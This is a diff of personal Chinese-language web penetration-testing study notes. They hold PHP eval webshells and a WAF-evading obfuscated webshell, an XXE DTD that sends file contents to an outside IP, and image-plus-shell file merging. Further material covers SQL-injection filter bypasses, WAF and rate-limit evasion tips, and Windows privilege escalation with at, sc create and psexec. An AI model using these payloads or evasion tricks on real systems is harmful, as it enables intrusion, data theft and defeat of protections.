@@ -32,9 +32,10 @@
 2023.10.8
 	SQL注入
 	flask的ORM模型可以避免sql注入，因为它在代码中不用写SQL语句；
-	弱类型语言会自动推导传入数据的类型，如传入8是int，传入8'是string；而对于强类型语言，如果试图把一个字符串传入int型变量，则会抛出异常程序无法继续执行
-；所以强类型语言很少存在数字型注入漏洞；
-	
+	弱类型语言会自动推导传入数据的类型，如传入8是int，传入8'是string；而对于强类型语言，如果试图把一个字符串传入int型变量，则会抛出异常程序无法继续执行；所以强类型语言很少存在数字型注入漏洞；
+
+
+
 2023.10.9 MySql注入
 	判断注入：
 		老办法：and 1=1 --+页面正常	and 1=2--+ 错误
@@ -58,7 +59,7 @@
 		into outfile 或 into dumpfile 写入函数
 		
 
-	把注入语句中的'xxxxxxx'字符串换成16进制可以绕过某些简单的SQL注入过滤器和php魔法引号；
+	把注入语句中的'xxxxxxx'字符串换成16进制可以绕过某些简单的SQL注入过滤器和php魔法引号；（宽字节、二次注入绕过可魔法）
 	MySql的关键字不区分大小写，可以利用这个绕过简单的关键词过滤，如select可以改成SelecT；大多数DBMS（数据库管理系统）对于SQL语句的关键字和标识符是不区分大小写的
 
 2023.10.17 
@@ -137,6 +138,10 @@ copy 1.png /b + shell.php /a webshell.jpg
 copy: 这是一个用于复制文件的命令
 /b: 这是 copy 命令的一个选项，表示以二进制模式进行复制。这个选项告诉 copy 命令不要将特殊字符解释为控制字符，而是直接复制它们。
 /a: 这是 copy 命令的另一个选项，表示以文本模式进行复制。对于文本文件，这个选项告诉 copy 命令将文本文件作为 ASCII 文件处理。
+
+Get-Content -Encoding Byte **6.png, gg.png** -ReadCount 0 | Set-Content -Encoding Byte **6gg.png**
+
+
 
 iis6.0
 文件夹
@@ -226,14 +231,14 @@ ftp://192.168.64.144:21
 
 RCE指两个漏洞，代码及命令执行漏洞
 
-<?php
-eval($REQUEST[x])
-?>
-x是代码执行
-<?php
-eval(echo `$REQUEST[x]`)
-?>
-x是代码执行，仅限于Linux系统，Windows不支持反引号``
+**<?php**
+**eval($REQUEST[x])**
+**?>**
+**x是代码执行**
+**<?php**
+**eval(echo `$REQUEST[x]`)**
+**?>**
+**x是命令执行，仅限于Linux系统，Windows不支持反引号``**
 
 WTS-waf
 +号替代空格可以绕过waf
@@ -284,7 +289,7 @@ java.io.ObjectlnputStream
 序列化：
 ObjectOutputStream-->writeobject ( )
 注：该方法对参数指定的b对象进行序列化，把字节序列写到一个目标输出流中
-按Java的标准约定是给文件一个。ser扩展名
+按Java的标准约定是给文件一个.ser扩展名
 反序列化：
 ObjectInputStream>readobject( )
 注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。
@@ -292,8 +297,8 @@ ObjectInputStream>readobject( )
 java反序列化payload生成工具：ysoserial 
 
 下方的特征可以作为序列化的标志参考：
-一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据
-或者如果以aced开头，那么他就是这一段java序列化的16进制。
+一段数据以**rO0AB**开头，你基本可以确定这串就是JAVA序列化base64加密的数据
+或者如果以**aced**开头，那么他就是这一段java序列化的16进制。
 
 
 
@@ -372,7 +377,6 @@ test.dtd:
 #&#x25;表示%
 "<!ENTITY &#x25; send SYSTEM
 'http://192.168.0.103:8081/?data=%file;'>"
-
 #这个变量的作用在于定义send变量，把file变量的内容发回来
 
 %payload;
@@ -410,7 +414,7 @@ JAVA安全-JWT安全及预编译CASE注入等
 
 通过使用case when语句可以将order byl后的orderExpressioni表达式中添加select语句。
 
-payload：case when(注入语句)
+payload：case when(sql注入语句)
 
 2.JWT安全
 
@@ -463,3 +467,171 @@ jwt类型漏洞的检测：
 2.Authorization字段
 
 3.JWT数据包格式
+
+
+
+目录解析权限：某目录下脚本是否能在该目录执行的权限
+
+一旦设置目录解析权限，即使上传了后门木马也不能执行
+
+
+
+漏洞发现
+
+goby（网络测绘，忍者里有旧版本）
+
+AWVS（kali）
+
+Xray
+
+metasploit
+
+漏洞修复
+
+打补丁，关闭入口，防护应用......
+
+
+
+#已知CMS
+如常见的dedecms.discuz,wordpress等源码结构，这种一般采用非框架类开发,但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘，Seay源代码审计系统。
+
+#开发框架
+如常见的chinkphp,spring,flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。
+
+#未知CMS
+如常见的企业或个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的源码程序测试思路：能识别二次开发就按已知CMS思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。
+
+apk提取url-->**漏了个大洞**
+
+
+
+信息收集waf绕过
+
+安全狗：改请求方式、模拟用户（延时）、爬虫白名单，保证网站被浏览器收录，如360spider、baiduspider，修改此类ua头、找网上的免费代理，写脚本发包;
+
+阿里云：阿里云的服务器只能采用模拟用户然后用代理池或延时扫描，爬虫引擎对阿里云无效，速度太快都会封
+
+阿里云+宝塔+安全狗-->代理池或延时(至少3秒)
+
+
+
+webshell绕过waf
+
+1.变量覆盖
+
+原式：<?php assert ($_POST['chopper']);?>
+
+<?php
+
+$a=$_GET['x'];
+
+$$a=$_GET['y'];
+
+$b($_POST['z'])-----加密处理--------->$b(base64_decode($_POST['z']))		//命令执行时要把z值base64加密，绕过waf的参数检测 
+
+?>
+
+http://xxxx/?x=b&y=assert&z=chopper	带入上述php代码就变成如下
+
+<?php
+
+$a=**b**
+
+$$a=**assert**; 	-------->$$a----------->$($a)--------------->$b=assert;
+
+$b(**'chopper'**)	------------->***assert('chopper')***
+
+?>
+
+2.混淆加密
+
+php在线加密把webshell代码加密混淆
+
+
+
+菜刀，蚁剑，冰蝎优缺点
+菜刀：未更新状态，无插件，单向加密传输
+蚁剑：更新状态，有插件，拓展性强，单向加密传输
+冰蝎：更新状态，未知插件，双向加密传输
+
+
+
+代码审计：
+
+MVC架构 url：xxx.com/index.php?s=xx&c=xx&m=xx
+
+一般s对应目录，c对应文件名，m对应方法
+
+**渗透测试流程：**
+
+1.目标确认	2.信息收集	3.漏洞发现	4.漏洞利用	5.权限维持	6.目标获取	7.写报告
+
+![渗透测试流程](http://www.itheima.com/images/newslistPIC/1634020289174_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.jpg)
+
+
+
+权限提升工具
+
+vulmap
+操作系统漏洞扫描工具，Linux好用，window不太好用。
+Windows需要用powershell运行，正常的web权限只能运行cmd，打不开powershell。
+
+wesng(补丁筛查)
+获取到服务器systeminfo信息，在自己电脑运行就可以
+
+WindowsVulnScan
+这个也要powershell在服务器运行脚本，运行完后产生一个json文件(本质就是systeminfo，格式不一样而已)，在执行命令导入这个json文件进行漏扫。
+也可以获取到服务器systeminfo信息，改成它要的格式，在自己电脑运行就可以
+
+
+
+at命令，Windows的计划任务
+计划某某时间打开cmd，任务执行后该窗口是system权限，这是Windows的逻辑漏洞，仅限Win7之前的有用(xp、2003)
+
+例：at 10:00AM /interactive cmd.exe
+
+sc命令
+
+`sc` 命令是 Windows 系统中的服务控制管理器命令行工具，用于管理和配置系统服务。
+
+1. 使用 `sc` 命令创建一个新的服务。假设我们将新服务命名为 "CmdService"，然后将其配置为启动 `cmd.exe`。执行以下命令：
+
+   ```
+   sc create CmdService binpath= "cmd.exe /K start" start= auto
+   ```
+
+   这个命令将创建一个名为 "CmdService" 的服务，其可执行文件路径为 `cmd.exe /K start`，并将其配置为自动启动。
+
+2. 启动该服务：
+
+   ```
+   sc start CmdService
+   ```
+
+   这个命令将启动名为 "CmdService" 的服务，也就是打开命令提示符（system权限）。
+
+pstools
+
+PsTools 是 Microsoft 提供的一组免费实用工具，它们用于执行各种系统管理任务。PsTools 包括多个命令行实用程序，其中最常用的是 PsExec 和 PsList。PsExec 允许在远程系统上执行命令，而 PsList 则显示系统进程信息。
+
+```
+psexec -s cmd
+```
+
+这个命令使用 `-s` 参数在远程系统上以系统权限（System）运行命令提示符（cmd）。
+
+这将在当前计算机上打开一个命令提示符窗口，该窗口已使用系统权限启动。
+
+
+
+数据库提权
+
+MySql：
+
+1.UDF提权知识点：(基于MYSQL调用命令执行函数)
+
+数据库安装时用的是系统权限，数据库用户root执行sql的权限也是系统权限，所以只要猜解出root用户的密码，之后执行sql命令执行函数即可。
+
+
+
+系统溢出漏洞提权
